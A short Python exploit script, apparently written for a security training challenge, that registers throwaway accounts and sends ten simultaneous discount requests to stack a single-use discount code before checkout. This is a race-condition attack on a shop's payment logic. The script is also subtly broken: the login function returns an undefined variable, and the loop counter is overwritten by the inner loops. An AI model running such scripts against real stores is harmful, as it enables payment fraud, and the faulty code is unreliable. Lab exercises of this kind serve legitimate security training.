import imp
from threading import Thread
import time
import requests
import string
import random


URL = "http://discount.training.offdef.it/"

def register(username, password):
	url = URL + "/register"
	payload = {'username' : username, 'password' : password}
	r = requests.post(url, data=payload)
	return r.text[r.text.find("Code: ")+6:r.text.find("Code: ")+6+10]

def login(username, password):
	url = URL + "/login"
	payload = {'username' : username, 'password' : password}
	r = requests.post(url, data=payload)
	return cookies['session']

def addCart(session):
	url = URL + "/add_to_cart?item_id=21"
	cookies = { 'session': session }
	r = requests.get(url, cookies=cookies)
	return r.text

def applyDiscount(session, discount):
	url = URL + "/apply_discount"
	payload = {'discount': discount }
	cookies = { 'session': session }
	r = requests.post(url, data=payload, cookies=cookies)
	return r.text

def pay(session):
	url = URL + "/cart/pay"
	cookies = { 'session': session }
	r = requests.get(url, cookies=cookies)
	return r.text

def items(session):
	url = URL + "/items"
	cookies = { 'session': session }
	r = requests.get(url, cookies=cookies)
	return r.text#[r.text.find("owned by you"):r.text.find("owned by you")+100]

def randomString(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))


i = 0
while i<100:
	username = randomString(10)
	password = randomString(10)

	discount = register(username, password)
	session = login(username, password)
	addCart(session)

	discountRoutine = []
	i = 0
	for i in range(0, 10):
		discountRoutine.append(Thread(target=applyDiscount, args=[session, discount]))

	for i in range(0, 10):
		discountRoutine[i].start()

	for i in range(0, 10):
		discountRoutine[i].join()

	pay(session)
	print(items(session))

	i = i + 1
	time.sleep(0.1)
